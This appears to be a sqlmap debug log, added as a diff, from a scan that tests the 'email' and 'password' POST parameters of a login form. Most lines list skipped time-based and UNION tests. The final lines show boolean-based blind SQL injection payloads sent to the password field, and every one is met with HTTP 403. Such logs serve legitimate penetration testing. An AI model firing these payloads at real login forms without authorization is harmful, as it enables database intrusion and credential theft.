+[08:23:36] [DEBUG] skipping test 'Firebird stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Firebird stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL AND time-based blind (ELT)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL OR time-based blind (ELT)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL AND time-based blind (ELT - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL OR time-based blind (ELT - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL > 8.1 AND time-based blind' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL > 8.1 AND time-based blind (comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind (comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind (IF)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind (IF - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle AND time-based blind' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle OR time-based blind' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle AND time-based blind (comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle OR time-based blind (comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'CUBRID AND time-based blind (SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'CUBRID OR time-based blind (SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Informix AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Informix OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Informix AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Informix OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'ClickHouse AND time-based blind (sleepEachRow)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'ClickHouse OR time-based blind (sleepEachRow)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'ClickHouse AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'ClickHouse OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (bool)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (ELT)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (MAKE_SET)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_SESSION.SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (heavy queries)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Firebird time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SAP MaxDB time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'IBM DB2 time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Informix time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_SESSION.SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SAP HANA AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SAP HANA OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SAP HANA AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'SAP HANA time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Generic UNION query (NULL) - 1 to 10 columns' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Generic UNION query (random number) - 1 to 10 columns' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Generic UNION query (NULL) - 11 to 20 columns' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Generic UNION query (random number) - 11 to 20 columns' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Generic UNION query (NULL) - 21 to 30 columns' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Generic UNION query (random number) - 21 to 30 columns' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Generic UNION query (NULL) - 31 to 40 columns' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Generic UNION query (random number) - 31 to 40 columns' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Generic UNION query (NULL) - 41 to 50 columns' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'Generic UNION query (random number) - 41 to 50 columns' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL UNION query (NULL) - 1 to 10 columns' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL UNION query (random number) - 1 to 10 columns' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL UNION query (NULL) - 11 to 20 columns' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL UNION query (random number) - 11 to 20 columns' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL UNION query (NULL) - 21 to 30 columns' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL UNION query (random number) - 21 to 30 columns' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL UNION query (NULL) - 31 to 40 columns' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL UNION query (random number) - 31 to 40 columns' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL UNION query (NULL) - 41 to 50 columns' because user specified testing of only boolean-based blind techniques
+[08:23:36] [DEBUG] skipping test 'MySQL UNION query (random number) - 41 to 50 columns' because user specified testing of only boolean-based blind techniques
+[08:23:36] [WARNING] POST parameter 'email' does not seem to be injectable
+[08:23:36] [WARNING] POST parameter 'password' does not appear to be dynamic
+[08:23:36] [PAYLOAD] test123' ",(()(.(.'-- -
+[08:23:38] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:38] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be SQL injectable
+[08:23:38] [PAYLOAD] test123' 'gCTZRW<'">)QJKfTM-- -
+[08:23:39] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:39] [INFO] testing for SQL injection on POST parameter 'password'
+[08:23:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[08:23:39] [PAYLOAD] test123'  AND 1631=6778-- -
+[08:23:40] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:40] [PAYLOAD] test123'  AND 8508=8508-- -
+[08:23:41] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[08:23:41] [PAYLOAD] -7205'  OR 9138=7930-- -
+[08:23:42] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:42] [PAYLOAD] -8704'  OR 1034=1034-- -
+[08:23:43] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[08:23:43] [PAYLOAD] test123'  OR NOT 8418=7927-- -
+[08:23:44] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:44] [PAYLOAD] test123'  OR NOT 7390=7390-- -
+[08:23:45] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[08:23:45] [PAYLOAD] test123'  AND 2185=(SELECT (CASE WHEN (2185=7942) THEN 2185 ELSE (SELECT 7942 UNION SELECT 6831) END))-- -
+[08:23:46] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:23:46] [PAYLOAD] test123'  AND 4969=(SELECT (CASE WHEN (4969=4969) THEN 4969 ELSE (SELECT 3492 UNION SELECT 3597) END))-- -
